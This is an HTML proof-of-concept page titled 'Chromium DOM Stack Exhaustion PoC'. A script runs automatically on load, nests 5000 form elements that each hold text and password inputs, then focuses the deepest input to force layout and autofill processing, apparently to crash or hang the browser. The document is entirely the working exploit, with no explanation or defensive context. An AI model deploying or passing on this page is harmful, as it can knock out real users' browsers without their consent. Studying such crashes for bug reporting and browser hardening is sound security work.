<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chromium DOM Stack Exhaustion PoC</title>
</head>
<body>
    <div id="root"></div>
    <script>
        function trigger() {
            let current = document.getElementById('root');
            for (let i = 0; i < 5000; i++) {
                let f = document.createElement('form');
                let input1 = document.createElement('input');
                input1.type = "text";
                let input2 = document.createElement('input');
                input2.type = "password";
                f.appendChild(input1);
                f.appendChild(input2);
                current.appendChild(f);
                current = f;
            }
            // Force layout recalculation / Autofill parsing
            let deepInput = current.querySelector('input');
            if(deepInput) deepInput.focus();
        }
        setTimeout(trigger, 500);
    </script>
</body>
</html>
